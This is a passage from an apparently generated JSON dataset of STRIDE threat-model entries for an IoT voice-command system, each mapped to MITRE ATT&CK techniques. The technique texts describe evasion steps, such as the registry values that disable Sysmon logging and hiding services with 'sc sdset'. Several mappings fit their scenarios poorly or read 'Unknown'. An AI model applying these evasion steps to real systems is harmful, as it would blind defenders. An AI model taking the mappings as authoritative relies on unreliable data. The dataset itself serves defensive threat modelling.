                "description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.\n\nIn general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485). ",
                "id": "attack-pattern--f5bb433e-bdf6-4781-84bc-35e97e43be89",
                "technique_id": "T1495"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious actor modifies the client-side application to intercept and manipulate voice commands before sending them to the server.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application can be decompiled or accessed by the attacker.",
                    "Role": "Attacker",
                    "Condition": "Application access"
                },
                {
                    "Assumption": "No code integrity checks are performed on the client-side application.",
                    "Role": "System Designer",
                    "Condition": "Lack of integrity verification"
                },
                {
                    "Assumption": "The application is not protected against reverse engineering.",
                    "Role": "System Designer",
                    "Condition": "No obfuscation"
                }
            ],
            "Potential Impact": "Voice commands manipulated leading to unauthorized actions or response tampering.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code manipulation",
                "client-side injection"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers modify server-side logic to divert user commands and responses to a different endpoint.",
            "Assumptions": [
                {
                    "Assumption": "The server-side code repository is accessible and alterable by the attacker.",
                    "Role": "Attacker",
                    "Condition": "Repository access"
                },
                {
                    "Assumption": "Deployment processes do not include control measures for code integrity.",
                    "Role": "System Administrator",
                    "Condition": "Weak deployment processes"
                },
                {
                    "Assumption": "Server deployment lacks runtime checks for unauthorized modifications.",
                    "Role": "System Designer",
                    "Condition": "No runtime integrity checks"
                }
            ],
            "Potential Impact": "Diverted commands or responses causing unauthorized control or data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "server compromise",
                "endpoint diversion"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An authorized user performs an action that they later deny, impacting action traceability within the IoT environment.",
            "Assumptions": [
                {
                    "Assumption": "System lacks comprehensive logging for user actions.",
                    "Role": "System Designer",
                    "Condition": "Insufficient logging"
                },
                {
                    "Assumption": "Logs are not secured against tampering.",
                    "Role": "System Administrator",
                    "Condition": "Unprotected logs"
                },
                {
                    "Assumption": "Logs do not have a non-repudiation mechanism such as digital signatures.",
                    "Role": "System Designer",
                    "Condition": "No non-repudiation mechanism"
                }
            ],
            "Potential Impact": "Loss of traceability and inability to hold users accountable for actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging deficiency",
                "action traceability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user executes a command via voice that is not logged correctly due to a logging misconfiguration or lack of logging capabilities.",
            "Assumptions": [
                {
                    "Assumption": "The system's logging framework does not include capture for all user actions.",
                    "Role": "System Designer",
                    "Condition": "Incomplete logging"
                },
                {
                    "Assumption": "Logging misconfiguration exists that omits certain critical actions.",
                    "Role": "System Administrator",
                    "Condition": "Misconfigured logging"
                },
                {
                    "Assumption": "Log data retention policies do not cover sufficient periods.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate retention"
                }
            ],
            "Potential Impact": "Lack of evidence making it difficult to audit or replay user actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging misconfiguration",
                "audit failure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Administrators deny actions taken with privileged access due to inadequate access logs.",
            "Assumptions": [
                {
                    "Assumption": "Administrator actions are not logged at a granular level.",
                    "Role": "System Designer",
                    "Condition": "Insufficient log granularity"
                },
                {
                    "Assumption": "Log tampering or deletion by administrators is feasible.",
                    "Role": "System Administrator",
                    "Condition": "Mutable logs"
                },
                {
                    "Assumption": "No independent audit trail for privileged actions.",
                    "Role": "Auditor",
                    "Condition": "Lack of independent audit"
                }
            ],
            "Potential Impact": "Potential administrative misuse without accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "privilege abuse",
                "accountability avoidance"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data is intercepted during transmission between the client-side and server-side applications.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Unencrypted transmission"
                },
                {
                    "Assumption": "Man-in-the-Middle attacks are feasible due to lack of secure protocols.",
                    "Role": "Attacker",
                    "Condition": "Network vulnerability"
                },
                {
                    "Assumption": "Session management does not enforce strong security measures.",
                    "Role": "System Administrator",
                    "Condition": "Weak session management"
                }
            ],
            "Potential Impact": "Unauthorized disclosure and potential misuse of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "network vulnerability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized individual accesses stored voice recordings from cloud services that lack appropriate access controls.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage does not enforce proper access controls or permissions.",
                    "Role": "Cloud Administrator",
                    "Condition": "Poor access control"
                },
                {
                    "Assumption": "Data-at-rest encryption is not implemented for sensitive cloud data.",
                    "Role": "System Designer",
                    "Condition": "Unencrypted storage"
                },
                {
                    "Assumption": "Cloud service provider's security policies are insufficiently strict.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Weak security policies"
                }
            ],
            "Potential Impact": "Compromise of sensitive voice data leading to privacy violations.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud security",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive logs containing user commands and responses are exposed due to misconfigured logging settings.",
            "Assumptions": [
                {
                    "Assumption": "Logging settings do not mask or encrypt sensitive information.",
                    "Role": "System Administrator",
                    "Condition": "Unmasked logging"
                },
                {
                    "Assumption": "Logs are accessible to unauthorized parties due to weak access controls.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient access controls"
                },
                {
                    "Assumption": "Log storage does not follow secure practices.",
                    "Role": "System Administrator",
                    "Condition": "Insecure log storage"
                }
            ],
            "Potential Impact": "Exposure of sensitive user information through logs.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "log exposure",
                "misconfigured logging"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial of service (DDoS) attack targets the server-side application, preventing it from processing legitimate user requests.",
            "Assumptions": [
                {
                    "Assumption": "The server infrastructure cannot handle high volumes of traffic.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient resources"
                },
                {
                    "Assumption": "No mitigation mechanisms against DDoS attacks are in place.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of DDoS protection"
                },
                {
                    "Assumption": "Attackers can direct significant botnet traffic towards the server.",
                    "Role": "Attacker",
                    "Condition": "Botnet control"
                }
            ],
            "Potential Impact": "Service unavailability affecting all users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "traffic overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the IoT controller firmware to render connected devices non-functional.",
            "Assumptions": [
                {
                    "Assumption": "The firmware has exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Firmware vulnerability"
                },
                {
                    "Assumption": "The IoT controller lacks protective measures like fail-safes.",
                    "Role": "System Designer",
                    "Condition": "No fail-safes"
                },
                {
                    "Assumption": "Firmware updates do not address known vulnerabilities promptly.",
                    "Role": "System Administrator",
                    "Condition": "Delayed updates"
                }
            ],
            "Potential Impact": "IoT devices malfunction causing disruption in connected services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "firmware attack",
                "IoT disruption"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the IoT controller with an excessive number of control requests, causing it to crash or become non-responsive.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller does not have rate-limiting mechanisms.",
                    "Role": "System Designer",
                    "Condition": "No rate limiting"
                },
                {
                    "Assumption": "The attacker can generate a high volume of requests rapidly.",
                    "Role": "Attacker",
                    "Condition": "High request generation"
                },
                {
                    "Assumption": "System lacks monitoring to detect and mitigate such attacks.",
                    "Role": "System Administrator",
                    "Condition": "No monitoring"
                }
            ],
            "Potential Impact": "IoT controller unavailability impacting control of connected devices.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "request floods",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits a flaw in the server-side application to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application contains vulnerabilities that can be exploited for privilege escalation.",
                    "Role": "Attacker",
                    "Condition": "Application vulnerability"
                },
                {
                    "Assumption": "Administrative actions are not properly restricted and audited.",
                    "Role": "System Administrator",
                    "Condition": "Poor privilege management"
                },
                {
                    "Assumption": "System patches are not applied regularly.",
                    "Role": "System Administrator",
                    "Condition": "Delayed patching"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive functions and data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "application vulnerability",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a compromised IoT device to gain higher privileges on the network and access restricted resources.",
            "Assumptions": [
                {
                    "Assumption": "The compromise of an IoT device is feasible due to weak security controls.",
                    "Role": "System Designer",
                    "Condition": "Weak IoT security"
                },
                {
                    "Assumption": "The network segmentation is inadequate, allowing lateral movement.",
                    "Role": "Network Engineer",
                    "Condition": "Poor network segmentation"
                },
                {
                    "Assumption": "The attacker can exploit trust relationships between devices and systems.",
                    "Role": "Attacker",
                    "Condition": "Trusted relationships"
                }
            ],
            "Potential Impact": "Compromise of wider network resources and escalation of attacks.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "network compromise",
                "lateral movement"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--3959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious actor exploits a flaw in cloud service configuration to escalate privileges and gain control over application resources.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service configurations have vulnerabilities or misconfigurations.",
                    "Role": "Cloud Administrator",
                    "Condition": "Misconfigured services"
                },
                {
                    "Assumption": "The attacker has initial access to the cloud environment.",
                    "Role": "Attacker",
                    "Condition": "Cloud access"
                },
                {
                    "Assumption": "Cloud-specific security controls are not implemented effectively.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Weak security policies"
                }
            ],
            "Potential Impact": "Full control over application resources and potential system-wide compromise.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "cloud exploitation",
                "service misconfiguration"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "11",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a legitimate user to send voice commands to the IoT system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker must have access to a device with a microphone.",
                    "Role": "Attacker",
                    "Condition": "Valid when the attacker has physical or remote access to a device able to send commands to the IoT system."
                },
                {
                    "Assumption": "Voice recognition does not distinguish well between different users.",
                    "Role": "System",
                    "Condition": "Valid if the system's voice recognition fails to accurately differentiate users."
                },
                {
                    "Assumption": "The network communication between the device and server is not fully encrypted.",
                    "Role": "System",
                    "Condition": "Valid if the communication lacks strong encryption."
                }
            ],
            "Potential Impact": "Unauthorized control of IoT devices and potential compromise of system operations.",
            "MITRE ATT&CK Keywords": [
                "identity_spoofing",
                "voice_commands",
                "network",
                "user_impersonation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the server-side application to provide false responses to users.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the network communication path between the client and server.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can position themselves within the network to intercept and modify traffic."
                },
                {
                    "Assumption": "The server's identity is not verified by the client-side application.",
                    "Role": "System",
                    "Condition": "Valid if the client-side application does not verify the server's identity through certificates or other means."
                },
                {
                    "Assumption": "The application lacks data integrity checks.",
                    "Role": "System",
                    "Condition": "Valid if responses and command integrity is not verified through hashing or similar methods."
                }
            ],
            "Potential Impact": "Misleading users and potentially causing harmful actions via IoT devices.",
            "MITRE ATT&CK Keywords": [
                "identity_spoofing",
                "server_impersonation",
                "network",
                "command_injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use a compromised IoT controller to send false information to the server.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller has exploitable vulnerabilities.",
                    "Role": "IoT Controller",
                    "Condition": "Valid if there are known or unknown vulnerabilities in the firmware or software of the controller."
                },
                {
